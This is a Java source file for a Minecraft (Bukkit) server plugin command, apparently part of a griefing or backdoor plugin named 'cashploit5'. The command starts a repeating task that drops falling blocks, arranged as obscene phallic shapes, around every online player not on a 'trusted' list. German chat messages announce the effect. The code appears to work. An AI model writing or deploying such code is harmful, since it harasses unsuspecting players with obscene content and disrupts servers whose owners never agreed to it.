package de.cashploit5.v1_8_8.command;

import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;

import de.cashploit5.Main;

public class FallingPenisCommand extends Command {

	public FallingPenisCommand() {
		super("fallingpenis");
	}

	private int sched = -1;

	@Override
	public void onCommand(Player p, Command command, String[] args) {

		if (sched == -1) {
			Main.sendMessage(p, "§aEs regnet SCHWÄNZE :D");
			sched();
		} else {
			Main.sendMessage(p, "§aEs regnet nun keine Schwänze mehr :c");
			stopSched();
		}
	}

	public void startSched() {
		sched = Bukkit.getScheduler().scheduleSyncRepeatingTask(Main.getPlugin(), new Runnable() {
			@Override
			public void run() {
				for (Player all : Bukkit.getOnlinePlayers()) {
					if (!TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString())) {
						Random r = new Random();
						int x = r.nextInt(61);
						int y = r.nextInt(61);
						int z = r.nextInt(61);
						x -= 30;
						z -= 30;
						Location loc = all.getLocation();
						Location l = new Location(all.getWorld(), x, y, z);
						loc.add(l);
						fallingPenis(loc);
					}
				}
			}
		}, 0, 20L);
	}

	@SuppressWarnings("deprecation")
	private void fallingPenis(Location loc) {
		loc.setX(loc.getBlockX() + 0.5);
		loc.setZ(loc.getBlockZ() + 0.5);
		loc.getWorld().spawnFallingBlock(loc.add(0, 0, 0), Material.WOOL, (byte) 6);
		loc.getWorld().spawnFallingBlock(loc.add(1, 0, 0), Material.WOOL, (byte) 6);
		loc.getWorld().spawnFallingBlock(loc.add(1, 0, 0), Material.WOOL, (byte) 6);
		loc.getWorld().spawnFallingBlock(loc.add(-1, 2, 0), Material.WOOL, (byte) 6);
		loc.getWorld().spawnFallingBlock(loc.add(0, 2, 0), Material.WOOL, (byte) 6);
		loc.getWorld().spawnFallingBlock(loc.add(0, 2, 0), Material.WOOL, (byte) 14);
		loc.getWorld().spawnFallingBlock(loc.add(1, 0, 1), Material.WEB, (byte)0);
		loc.getWorld().spawnFallingBlock(loc.add(-2, 0, 0), Material.WEB, (byte)0);
		loc.getWorld().spawnFallingBlock(loc.add(0, 0, -2), Material.WEB, (byte)0);
		loc.getWorld().spawnFallingBlock(loc.add(2, 0, 0), Material.WEB, (byte)0);
		loc.getWorld().spawnFallingBlock(loc.add(-1, 2, 1), Material.STAINED_GLASS_PANE, (byte) 4);
		loc.getWorld().spawnFallingBlock(loc.add(0, 2, 0), Material.STAINED_GLASS_PANE, (byte) 4);
	}

	public void sched() {
		stopSched();
		startSched();
	}

	public void stopSched() {
		if (sched != -1) {
			Bukkit.getScheduler().cancelTask(sched);
			sched = -1;
		}
	}
}
